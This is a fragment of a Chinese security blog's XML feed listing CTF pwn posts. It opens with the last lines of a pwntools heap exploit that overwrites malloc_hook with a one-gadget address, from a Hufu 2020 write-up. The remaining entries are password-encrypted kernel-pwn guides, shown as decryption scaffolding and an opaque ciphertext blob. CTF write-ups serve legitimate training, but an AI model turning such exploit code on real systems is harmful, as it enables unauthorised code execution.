class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19BaNKvvgfw96KE/Zfzc7wgSMlryI/PJPpZCrQSwZHIAmE680l0nlF1TZijEo0Du/12G7NkVhhZl1AAViUZayUw4IVEUwa2iTDoaUIh0LYtxnNhpVnScgykCUwG6gV4YI6I3hM3yQ73E3USvDkW7wW9/jNlhQ0izAuTk0LEeoe6hvB7nvocBXEL7BUyb1/3qadP3PuBlY968L+c9KFmjCD1RY5A5xQncitBEZRXGBmYobi4qXLqlft+lttU9WvtnamiBXI5rzy5ArzRunlVguXNgJkhumtldp7yb4vuVrZe8h/MW+F40dxPsD9WaElIPzK488bG8PbfWGw+UCtKs319SOAi1TFDgxpls0GIua6r5P7Q6wuCku3mEY+JLxtPca0me9acZLl7HDE/I7PZUPvhRYdpeXpH98h6sKX4bH9A75sAvbWSQqobSM91sOFYWB9tPCefHDFRfviSVjEGyDqea17nbdIaQ8G7qx5s7cRUDkTYle10GISos2AA+GG8qnsyXfnvxHo93JsaKQ7j4Sicd7sDzu9dXbcGaKKrLDl/Ijt8SmAD6EI3gY5RG7bV8/LrYG5tEJoCUWJJi6+7sBKuRiiiecwU1Fau8WZV+424y5JW+cSmxctXG2s6MgNRp9fAmHY8hTfXpV4VQ9FPHo8YHxyxCjD1oWrLJiyfBOuS7ROwy+n4O9/tH6/nBaSP/UmyTqGiq2DqwFOQ+tfw+GVHHgD6vXm/XOZeBTiDNj/QIc2DGTwh2/DF1SHdrZiPAybicN7PLJ6YxjyIJQrCMbyVEzDNxFcPTZHh660bQAJ2VOBDTx/GkKZmoTWyom92nkDXfA2Ec050tUxUf81T3UVg4l0bRB9m9F4JgQtVa/AOpDsmUeznR2hh3w7zp3YquPgHpun+aKGOVV8fL7JULMRNYoA3/ukQSKNpu3AMF9G5eqWNo9HaHuPSAo9BWdfC0RyxaUdmCVaRGzv5mrM3Xbd339sLDBCantXdevQhsOyj2ZJqPBNWHv7+U+FmXvPA16IEypsY4y2XRVUGQWeeh1yZQZ5lIDicOD9b6ABMkJPd9BddR+hoXn+SkwKkUvfNJpbEhD06bCyIoBWr4ifxIPFdIyVe2exdeXRx4V0tXrJUTkUT8Cv1N1qgtot/Ps40eG1TCvjnnSgY1QhH8jJlPKImIeMZG4zvdAm3brvC/96KZIzdGkQbVrcTygW6BzWFA739p3rJ0g6FHRsDE8YK62YpMwp8QTn0LRlyJZYTDcaCktwnESNriA9wGMtIVo9vpq4Pk9Zz1QDU/UiQqPgfnjPcM4f4nGe9XfQCYfHQgXg56cuqXWIcd5WPuemKDXRLVHiF65wXacP4Xa/i7V4ezngMQAdvt6Aas8WZ7fXjiz2lUzH0w9gGSiV4kn/3WUv71qDZ3RS5e00miuf+OhG6rZHiktLO61lxvqIWMisHIL8S1hRetcNsQZjKUEAzBvQRUHqcO2ZEXQ/k5WIjz7DHKL5QYhDgO1hvOP/MguCxIRQsgBesUX6+wGgoVio64Vc0I3J52TiSF6MHZosX/+6iDApvpZ6N/EcVyvSygULzTjOx32fA0uABubwx2O/l3A8X87neBNrorVRUnf+DAHoqI6nsVWlzmCkZ7pFO8EHQFg+yhSt1PrDYL3w5Exhy/5M0m7DdIV+P3f0UhEsuKcfS6EOHa4yzbpKPPhDxn5Awccf1MCTAdS7g7Z/RYaF5nMCf3FIXqjPd0kaFYCmWnV1GuvGa+bwoSezU3G8cszz8mrKoJWiW+RU3MPVyVTBVzlA0yJtSq2RgGus7fyX2FLvA0B4pWVnUzeJerFuuGKnwaBSQHR4/OKcQPDtiGvUr8mgYai1nl7tkp4AFn6XzAahGYThRsnHsCnqR2cWYNQSpIdKVlOYdbSfs7GhkqGv9K5H4USh9l+AcR7d+d/bFrh58A0hIQ4J9vcL7rpjw+J8lSGBDRKC7k7U24M55aiWPBC8zM3f6yc44MCqOH6fnX9nfUWePbZ70akwuNA20HIx7UmMttAVMOK3+eC3NJz++RG7o+EcAoGmbpsDMGkzG082S07rSDvhN3EzIGfN9TlFtbkpuPhRK5x/vMJ1Dxa4z/XqzM+aD4dHfPXdA7Fp2g6uXVygL+TqFoISzVncqWMF1AAoOp7bDiCB64vS7Fs83etgh8u4ADsIOP5I14UhymHUvuxHRW1J6MIecBO3Nmpx6d9nL78Y8Prg8e7Tj2xmaghd4buZay62GLgWr5e1EIIgmtzb8PKUFzN9wBefI2g7H/9K5XTG0NJC5BWjI7nIJVvkSSWBquDONELu8i5yCf4Ny+45seL9k30Hr2/opQYsLZAFiTa4WOrll3slwj7JDQ8+F5pEAdOgSlNlbRFAjbDp6I4WWqdC4d1yjs4H92L255akdD+65znJl/G4UOh4Xdp1df9qWgvCBx/onEsLDPsxQ/ihPalXDfVujD19x6XVWPZuRGvLAr9ReqhoHMfgUvHELoik7lbY73ACzReQcTLR0PK/+1cQJGZ3zj1cuqmb2G1f2Qio6+XRA7r4IjBsB2tCv4H1P7GHYDsVuIXusDnSkGd8He7vgu7BTK13H/EpXKHSK3QNJjAiiqakQpjdKgeaiM4D4FMq/cniAEkfr3k2gWXOWiqCcg1bS0Wha9juDI/wVp1MLZlRksxMq2fbNT6LWgll2SdF3hss8X2ajjhieQ0hkieKai0d1MQFA9+pqINXa8TBf5/hG5pBJkQThO8hZblosHzLfvRO0uCQ4oqqUlcFXpyzlClzBp4kPF0Z4//g4RCezonFSDfE12a7j0HftSZbsXkEwf9IQH3B7CiAjwK28ZMTvaiCahjGZ8yF3A3zAHM7hbpUgJqs5MzcZQLMFyPdRY7PVky+r7YbZrP05EHGOmsswZ2cW0djOe2gDjb/foQe78qwRsa3fW77hTYudC031ozh6xNrAmDT1mxrnIEmJ/I3Oofn+DCcdL96Pb2T5qU21VrGnnf+72IPqN1Sg870Ct8JNRIAOgg5DCunAHYzcWaK9da+vPgOkcXgtUycpYpacC1qz8SNqa4SxgwJUlObLVEKWpjJAmWhA+5LhZBEhrsw+r27zAyQfAthf6cU90KFM9zMuNMXg3s+pYQdhzr/+3xoEpSqr7sHOhUXBdxH618hinq7GeptWNyTd+hUcVKj4Xghp5rbGx3yS5Rmc2gC7dc4YD4npwX76LIMj/Jech6OMlyHP855cbiQzmNWyeO91fT/xPXM7hu2rGur44ErOAl/lgOzLkYf190dpJWMw/ZjVbNBNzZpoZwe5qbGhZaQpGIMNot9w1SC8u8/Hxc+tFpWVd6F0Gd+7zIu7kjwi0Q7p1IJav+1QSKZ0d2lto3p4je/Djdmvr6YpJxr1qeYe7KDTRBp7aIeN+Sv6RsoKU+tNJXxuc9gB9A1M8sDR+A9rz2ONRbcnfVR3M4kjagctnp+La2lcrkE78XUHrxEm48G7J+PTXE3b9WSef88yrLkikNv1B7HZv5ejJ8rX6poTFHHoJ0/24tsiJfM/vDvqKgtbR4JRNwOVWVV+L5bYCuSceziOWBp7WDkrUo0DguOVb8fGCni5HSb6g5DV06fTyIcMITieiO/td/1A65gKPT+ydBn/0b6ccaAcV7BWIrmEBmcyzwdtlJgbCyp+oOrmfOIIiDX6hFBPPZDxaD+2zmxAj1U3yR78Sx4mKKUOAZc5WHYUIIdDgbcmNMSfu1erT93bOM9B/3Z97h46bnGnnJ8UZGDVuhKwCJmZRWHtzDpYulmLGd2hz/lFbZcB0jmOD/K+B99IQ/hf697eVvAOgicyJnvs+PVjJOPancSHSoJfVwUaNX9pD1Ma9ZqLF5/g5kTOBtQmhBL8wTx4VwwjarkskWCg1FmszkyMfjIdraMGdJoFCLZ1ZOabODwJ29AhUc7Bj+SHA9iQJqJYqDixU5jxCe3nh8xiQh5q9w/DSYKaZZ1o2HifsOOqnm2RxcV+S5SDw8Bm36PIFfAU3Du6Z0/lKFC/wmSBdZxMkMTmlkkqEwUvXHsXB40Funt8k3u0gml0agY80OCtK8ldo1UJ86UysxjEn5QIpRD5fWdh5xeSogE1w1vxW/VRGrmubD/Au0uHzoUc4ilnODwNWlVBlGkNcLgPtXRjPvhKrDePWZ3f2C9oLuhMZEx38v6vsCSNkdvqcbY2whtbdDXSH6kp2SB2EE14UMXJZrfJ0g0oPs5SM2A3YIxfIBWnOTWZ5E50vnbQ/EMufj/UnYQpMyozKUnx9QbCgp58w6jTM4Wo1wsLeRMnAYZxLddmFLTrFvNmu+lQP/nEDuG/KnY/9HPEh1pVUTs96e9GyYyWW7otr+NqpcQLKHUiRSUHqZIbIX/PIod4//3pi6KkwgaCZUU0b9zuOBeHtOJWdxJJwVq+nKcxUN4K/xfA0CUF1D1VYdWnUyBh3lWoWEZSdToE1f8rf4TwoOJHq49lJFudcSRzFqHDC1re7XbQj4VPlV7WBF3+13O3OgnVUmCdpG/7uwOID0TY3ht+G8fPMu+orF2gkqEgS0vBG6IytNtS0A6Fba0CmyDAzK8fAbQnImLQenkJ37mSCdQWC4qvjXTUZXzMx1PJooFzCtdBrADvOObsq24eFSa68m0gDNN73YhVJp1cBTbYGZGnZNQ/QaN0IZqeZuvShgIzeFeDQmNDoFJo3k2pwbwoV9sTKsBf3W7422QSNqV1Pv8c1mpQOyhU+XyEom6GmG/Q1ufFUXZPUqPRn9xyKH0f5VPv3zo/fnLwlbunUkdgOVi1qgLUsqfeW0DEE74pCXKyzsWXwcR8Cvb8vxnF7USHD68lWybg5Kn+5CP1e6lhOgYn5A3UVsmR98nke5MRbyJ+nXVs1hc+zwC5KJ/b7AC1vbAppuXCXo/NuCneC72KePR3aBr8TsQYFiubrOHHe+CxYbLJW0/zY/IHcU5Pi2FtQec6oAUlahN1HgjkFngEWkuFBagCDrwaKYaxcMGh5Y9HT6hqJOzgdd7Z7BhiNGNH3PSDizDwoZXxLnInbyi0o7SN/sv4CoOwkfpOcngCcLXLXLPYyOEYCGrVUX6GwKP+q/wjO0mqVMpps9OmsNQRXO0hLDE3rWtOYLGLCo2AZ3idlKM6jAuVFBr+3r8bXuNuLa5I3ij/p3zW6DGtgOQ/awqW0XEjmJ9xZ1YY25q0WhuO/dxxJQPyQCLWSesmMi2QgpHrnLhi4xXDIg+/FHACEa0+EUmuvsba/eYb0WEO6lLemvLxiJjJ1egRIAPEOlP2YsK+tkn0fT7fAj4yFAyWb+aoJfheOuNtGiyK2Q+S2O6Ry7xAnDvIBQi2YYKOF6UZJtZhvE7LVGaCJOyEwa+kugceWahqmBtW7QVX0s698rCttrKQsrpOfpa+vU81TariJvdR4hw+EpRYlhIXnq5+CWOcszzLruTzN60MoEEDcxSKS58PE6h5NYgPhzz3cw1JK0U6sVN++tfveMCGaoOIUbW/+LNA3pbV1oTpGEV9QgbwDSt8ODP89rQT3Zmj0aUYDhJlWXWr1xr94gqpfm/K3NKKvQFhrrYhj+ouIsuIoBxaO9LvMd0QjzYcjL1qz5OuqC8461echeqiitPAMtiLRFHkPLAPPfgN24rIO0QkaG5MwSFHzhV/G7xCVO/vuLafIgQey5fVJIaUSB1gXv+87oy7XS9DrwoRIHwTUuYg00oxWIDAN15wuB4WMnb3DJ/OCA0TfX0/pzsrK21ENvP4ewYp+dxpoS6UGPHIFrjjpT9PFHed3IksYx2skVJXhHL5OafkdV3ilEujlclb2XPa/9EXtJxSzJTUdKwzGS71oI09dAApP7NRcQo1SL4k/jLQXWb6Uj+3wMpUuvGuwhBBW92QvoopH9GQQf0+03BGryz8xzAhpuk5SCZhSxBt2uZXghH7U0tBd1y2lD+JQM6BYBsPtwwn/0SpkMQLcxRbQ0990mVU2wRNCC+Gr7QMpxshcP5V6zkKB0FCJQzdCSvbY5qRLfOl1aG5GsmtdPt+sB9GKYvYUnxY56hbkW+lAEtHtRWRNECpXOh/F6q0OODNPGhW1M6VLYQP6IIzCK1HqNpdj57z4PGPM8p5sxgJgPQL7p4rt3GPoudWppsiilm1JDwe3hUtvTj5ggcLOYIIz2RF4ykIHwqhmbXJY1xhSg/CSY/nHagdKNCkhxta8J6KDmnKBNtqOANl7AQiVhrgHDXPidJvukRHopELv9DIJf/FS5M8zvVkYEOazFwG312D6bDPMF2sQ4JKuFO09LxbHs5yoZfDB86TgyK3DQOOfb6OH/KHcpevAuWhU1gL+hpGOCUo1L1HqdPvOj9vbvERSsn99x4H74Ar+0/oQNBVlX3vE8J4O2BsgbL8Ap2ArhE7OrRNRiB3JK8+fGi+1nZWdd3nEKnd1gIeqVLS+meQjwhkr1a6LeL3XguZeLWrOxtxMLGb0oHcHddRn41GnuR2BkEwlygcu01UWGvJtx9Jypnq8JPwE4Zgaipa00qWOsaU+rlNgnkXtouZ8Uh/XZnKMdkOB2PV0/mL3HIPAqAQfrMBUrcDHHSw2FursfokdCPbVp1oqjBGa1RwEiir5pfgs5Km2IyGDhfzQ9cnaLBT4fb4Qw2LR5FDMKvq9HGLbyw0fDaumKdmPo3fKZQVlDcKt5akkozQt1mz+fcMspuC7Bnq0Pym06W3e0uDWonhTvolQWmCTl+DX/Idocy2qoZUAvqD5+wyJ0FAA0Ta9JFlttlVocDs4/xNj6+tUB1zE2ua829wleHbJNtfpWAZJjdGBH0XbUYt2vWMP9g++smGRwZebxisb+wdFXB4bMwRfiI/yKFxI4MnxFIcsYONxB/BCHhaRm7CXOdby5YrS8zfsuwmURzSE6YteG4xiR1L37o+r/4sdzzn9UMt8pu25r3Flfd1mMOLMxk8O/V+xfDXA6yA1kDPTNA+gOa54lFjqWr1W4NpVoj7ww5p2iqBFD95f8yuFNvL20LhyHLH5KamwnpJnk89vSy90e3/7qyJqZEKNb1F+vXdT+12ZKH9nVc5We2ja5JZ5R2NezotZq4UGsHbvnw+0P7z9RgsS2prhTmgKEkQvx13IMwx7ROEHiiERM8SNRQSG3YtlPppb+xjBnW2KjdfLbOtxRMpYl6hliJ9eoqzZ/gAuxQsysVFo/JAkd20pzMekdXOPzGVILcHtMy4iQXmWgAudkHcvvGEjOHe/28PRhNSZ3EpDNSKnpuug2y99uUF3SoBDDAagXfAYYmO4LlAQJ7Ka5kO6472qPJzY3ZR6XrZM2qPjmdabvduMFyvXUPk3OAdFDq+Pn4vNjTZwamnM42NKjLaUKtQW11HuVhxqcoj8Rtcmz65C2jm+jXtWaj9y0rK2ngx0jL/ExVEwMN8TNm2wvQUBdB6G8jxmD/KJHOa+qjZmbTRhkxeuCoHChiT3sBAJikDJgpFPJ7NQ4ffZFCuY1V9r1HZltd+aek4dxf23TwQxBQtifIi7rt5jk4Sq6ot5U+XC9IOYYiesDiph2xQOFxaS4he/y6flGCVRyP7qc72d4/mazyqe+e06Ap8hEqdxj9KfDXLNx13G4hnr1onDQ/oG9Rd4/nIMeBAESnprpaiM6O3I12HI22r+SrrjWYrQZbhwGgeD8Hw/CZGmOGB9fgMpbE8oQO4TiYvhh9DB0jGegxZxyC7Rusyi7i5MU/r/96D0QqNvm5a2FnxxhJt4ezGnDpEDHIOZlDrz8dHdqVGbNUTNYRNz4GE0HcoPz4SAXtfXmp2b71E9dHEh5TRpEwiPhdjcULIZA1PCSe2N2cOBFdBQo7AtWfC5j/pZUFQ0zw+TU084eYRDkdByAsp8+k/xgfPeON3FjlZXe6zPE6OlKKQT8ioGJIKQNjxp8IQTXCfEFd8Majp1dTleeyzU5+zIIiAxuxoSONBLvMUM4H8fHOrusS/BIO5w8WSLV/y9Oque0YRzcdfVA5MiWN2T+gyCcYtRefnNs7dtdl3lSRIWmWhSbQhA2LULQc9+BJ3+K/4+2QIS9Acxm5Y+dFX9vB/HEInaCj7sxbL49cWlC6YfJGvLE201sMz1+rYiSeTy7S1isEFSKs11Owld+TjUntVlk022A7RmqcSZaibI7nl9UONDUDoAFT9G/XjiRhdb4dHJiuyzJv+6TMROal5OZony/C2dpVhWmLf8yK5HyE6fMCjc1DpMIup6kuQTx0wVp8nZvtQrMiUK7p3LNdDS1W3AvD9Y6FHcVm8Qcx1AOlvG6ukJEhCvDYLfnETc5P+S4vmeDFhSYDTMedIzvTO8TCVP2e1MCxcZ791rCuCp1WRQfzL2zKMhBj0gGqjINGcvQr+ooCkEYpfjU1iTQALrW/PmIcDATqLcLmt/aSntV6/Aa1+ABxuiUMSuAIXvioL9d2pLlcQxjYb7umT8U2UZBF++MIaADtyGAdBR8tttiBFsNgIplwZiIBS17G+t4LSRiHvwmzRrVv/wdUhxFQwmZHoOYeshzqoCqpzqh+roRc4A28qhbRd+br0rsr+/gNATGzvSj6IvUe9gUgwwFAlYmbXlXAzn9WCvbxdVwjizPVFedLOmtBmzSZa0zreiw9+CF2w+5hCjxDn1TnqV0jdMDj/HAmScASbc+TLnVAO6k43AVdRGknGPRbAMwryj/+g6k4SsqlVfrDldtyZcbDfm6w56N2Nn/FC79ssiAvGDva0SgzB0zqnDgrQAk/tgqkH0xm/FsojT/C8zjGFFayavLhycuKvR5J3F3JsuzqABqAIWng9M+bayS0c8wksWROCSMLQ9szDfX/9bn2idaCqxUnSgxtL87g2XkfOJd9eaZSLc5tcvQ2x56vt7NVC58VGw16RdB6VoFd4NYiAzoJMgxUshvF7iTdTfLOEry/AWKCG/dFuzghWBFQczA0A+Jd7+FMbUaqxPCkGoCAzsPbZhyL+EDlIumSXYoAh7QtdZOoMxwenMYNzGdWVVSfHSYFBtvBe8Q0GCYnQWAOg6LLP3QPGI4QyTqr3dN6b208icKuIEDdZC6CiTrtt9YUlVGg7b5jXMuPM6CPrO/0zEWhG1bWYFCfs7cJICBPj066ptV91wOy/ANRl/7jaVuakAV0ympB1n29iVQPJEUKYO11/h8emqnmX/gK76UUQ8TC3kYziGXPVpE+Q++BV9Lzz+ZjFQ5fCJKXluktQM9GWCoTqJ1bQfcHwoNkXDmV9Kyshsd9mo98GyqC+FH7EwwsdaSxke6WNo//2shT0P0chzq/BDs42gQ+2SjJNxPUFkpFWSwjeMxzUk0w5xlVC+ywTcjc6RkDrmUqAidC7M5KS+ZQ84PQybStLvxwTWC6HUYL6H3TIVT4CT/mTGt9q9KZCarRfDVf9wYWkXRJwZzQJK04DBzaafAPjsLAQWItwZ9lwvfe9gx9sd0+6WUav+LxJ76bo8o1xNBixbKZbGYeAzP4T3mdaWUNs8475VdB+Uc3EMo3w+QNHgiNW3b1GbWkrDJcxN+KOeTTAAL97NqzSngeO/qqPS/mQm3b17ZrTSc+gr+T6xvBT0rQymFGsSbHd4cZjORs9mfevAxvqkvzza89ptJhzAWiHFlqDlWe604hsviiP364WHc1vkIvI5OKLobIBdL2d/YI7qSaXKNqA0TkRxnW39KxZi60qCtIhaHoxE9zyuE7RXXwuZM1bmY2b63lPhPmY1eqnFl1fgNMjLwLZtEZxzZ91LBFEi604MfMM67my/43zwVGMq/lT97qet++98njYWKoGhy5ZERaM7lau8IP0Nf9EBpahWNztjNWHZj1m11eQ4PwmvKkIs4Bp23zGH3y4Kc5lb41LvKBW68EGtcQhesBOl5p7xDXYomoDRvc9s2wkVFlAOQS61b7fOjbecBPxSLg7tEhJCNSJar1ngZpExCQC063JkhRxq5Z9f64cqIxTa+o6sgLYuEqASEo9Ttawwhk3XKeJfQriDweVTprzATAlOuG8SJZHG2v1lJO9n56brLeByn1SX1K6LoMr8RVa9Tmvr5r8/sr/pxDhvLJMacVmu86i9HBezEWqMUgw/a2jZKbWxja9NgbU2bIMHaUdVcGgd6F97rkzeNCQfZV0l5lxVYDIFKF1LRxHJNE0c8gy5fK+Bb3Y70muHQkHrZ7KfxsbhhfamPm6OSj5UiMLz43aoTTNLa0Q482qOE8H8N6i2piFLX3Cit42rrOMHXf6y8BFgsUj99/sDmfLrbEoz3xkqANNg+nbLx/UN6WfHVg54qG/VbMNRU3ximfU03AgGC2Y+uuIIl9HdDQ75ziK1ECLDqFWK2xg5oJsRcImErGnbRDMOvbCJHkNUCM9dYotiVQq3Ntye88b3rJhXG93rNJSu0J1NwF/zyUNjmGOsfqwdbqsr/HkxBIAh4CUG+57M3uIRAcam0tTRWL5CtLYTBQhNUikgNnVC9S2tnwpZgR+s79fOD3eXBks4aMFb7G+8Csx4qJ7HVZbM3zHE/8vtisqgOOHIikIho3m4YtmmdCuAhiuUpG77AKPRiBZOzL0rbQ4Dm3DqRX5Fz0V/8iVv9VjkSfFq1ynHAatq9RJyv1AZftaOfVudK3Dp6/X3vTXkEQkVpIqLfF9FsQDcl99MHbE8nceArTSkVtEO/noc2Aq58ThvwcOgQJBMOhkA7bJc90QRUeVSqZ4YxtL//XY9WniYPJcvBwiSPrf8EEPNjbdjzl1diTQLuItW/KQmtVWpywPzAPVUMcup0wD/P/ax/1BvxmPmxsPv1RZTNgS+dQYNdC8++mk7iqzkz4S7ur7dN5lUvffAN3ImWa9aEcS1C2bRSzGpVkPLNLkqiJfWVd8FoxmtS4zhzTa9hZxUKqzupCNhLWGDMqmTBVTJ9iNcKJ/CHJjjwMCskZzLk3Ai/m9FLjEW55ggBKkv98Q2KBwKePY5F7lQ+9I5vBGSemqIijO6QnU12fTy9eQmrzKSM1hGMRyH2nQ2zUc4Izk2xa4SfHVLBBdyOpPDJjwOp5eZkBfQURxEJT4d/zTXercJzAed2+ZXQWmrEa1Wm+K1AOoB4t32F3DjCupP2Apua38z4poHdlcFyAM0EYXyJ7shp2/5sHOkvJCDxNW0ZqcrZI6/nM7mhW+F2PIUuJ5dx+pzIE4Y4O8qpDlfyZQDFTcsiZZBJC1mbnQP2wJzH+zjE/Y0h4HjnClKG2Vb0wrULjIg//HKsvPlm7Y6SYKYRqWITu4BfOm0Ym9FRdniXdgvVxBtqHX5zeHWpMt/EZLQ88/CzwxZN6to57Nnazemh8Zq36HSBTGp5xqGAsyeeA9yLCxDbsICn5FDvA/v4t3b/nU4H4dQkS20bjrG1lVos92iKVaJTfUWUQw+W/tCawutzdnJLQLMV5cWOOt2BxF4hHC6lhHwM7xE2hNigeD/VaZtmu45r2xh+1qysMcb6t8E1SV4tz5iNelOV+CsDL0Bz100MlPtTUFhrlOnYGArYMJM5+v4/of4DmyRMkg5RCViAcq5JRsSmmt8asPelwH7tkHLYn35xyJ4OU0ICmBSskYVG3e97oGhJtmz/gDU/SBQz8gPcJEpZ2IkXxa6Y5+L3tr6N3qfs0UpsIiMCuUpGCIRNVWGJd1l16PQ5lLeI5QRnNKwRlgHMNZ+qAPRL+n0W5RDuJNXdUyNWCRwv2VyvEjpF0PPbHzzONVAlnBpWGTjDfBvDS8q5wPkQ4TK/UKlgM17hvkdf3jovfdUhCL08ToV5IRNOWOBsmfIzNYclzcxcIJ4+/l9HbogOx/ga+ASGdjnZ3Y1bTohVb9QJC6unzjHLAfAbjA7Bzh5joNbB8/UgDx8WE08g69TVLf3J4tbMGXLojdpHpebnxhwhrMq3bgI48JrILTbfVz2MqHjIFNE6q6lxzjTRDFXO/zUg8TslQNB5H9D5e6blOgcpmRTQNqV7lnLuvtDJseA3iuWr+EkQWAq5PLcb9u/Rl3uZV6LNl5nao1lW9MVYCdYicOYvxgZH2Zz8NqxAyQ+99aE36BLgN4AVtTuJi1/CpXvtzp2rGTvtgw0uBuegDQmVRrAMJki34oKyTQT8O199mHKrRwxp5t1AtSYck6Si1qXTKGaCdn98IxAVnqUmQiREjxKQa1sZ85tTvaGu60yyRCl3+UfxG+7nIIsJOO24tlxtCzz630SsrlGUX76c93U3171htuBs0E/YBt34l5zXfduT3YB9GqGieIPb6qF8OtA50BdZ5XYMzVkViO6omO8GsQZBhjFqyeLqOc9/rPTsNXegUUmotbbndaMTt1eQOdZLbLPkpDu44c/VX+hGbCwBV8zb8XgCAsv8/Wl1drhjcmeYvydFMFDUKyjyLnoJg+80Bkk5qXyugwd435VLlmjgAhVSb3wzaNhYkwhu40lOE25lXleD8OspsMPvwQIt9/R/VgGTI+/l1QdJn+t4ACYEbdLaiB+0e0o6PY2HApXL15yPVJJ7V8clU57RnZTlHrN29R4fvFqUJm6uzKTWPpfCdlaL7GV+ke49cW+SPcqjERkax2Ain7YFbGTHDyP07xS7ysY99gX9/T+902TfIGqmFPDN2HWuzEkprVtwwHIoViy0HAa3dPeqRGJZX0xfazQ5QlsfmWuoXH74zqCFw8CVWVVGsWrrqZqbPzAnieKK7ud89nXZYIiiv3+746q9qGDohSwzbbwgY9Y5dNmj2qVUP/n9Ozi9leKMUXb+pXXJzoH4Ds42foJgZZMP6/VnhJUAfr0pINWQpjG6wqwtB3FlvNdir1w8cZRbeLWYekanD/cp3KQr7RD17XIpB6EWnmYOnPZBVvxa34H28m5dMLLEoZZxaBNlQm9DTesIWJEZUqypbIZKCgHgMeRNP3B5fhZQHsmafNzshLHIQ0GxZ63wi+fvZRi0ENxJIHCgqbAAB+KZiXMsZYVVAZ4tLrDXaUQ8g76HIdeh+BdSkAyF/fszyuXlywTlbQcCV3idHW+Sk2plMwbd+dLUkrT57Rj/J5+cJYbwHn2c2zuRlbRBnWYmsSdYe7hysrCKv1D0pSc17OW7ZxkByQmPXTRDtwCL4UfaCq0rbD3gYxNcPNeJ8M8Uh5UQZCp4BcvBAUbRT03+/e+It13U7ptYDO52EJ8R8IJ7a/OPFjRLhGn5JZj1f/pIj6W+Q2Wqrtf5aCHnw42AYV9RSoUY9KRz+n70xaDL2VLBiyktwr3AllqSCWXbHF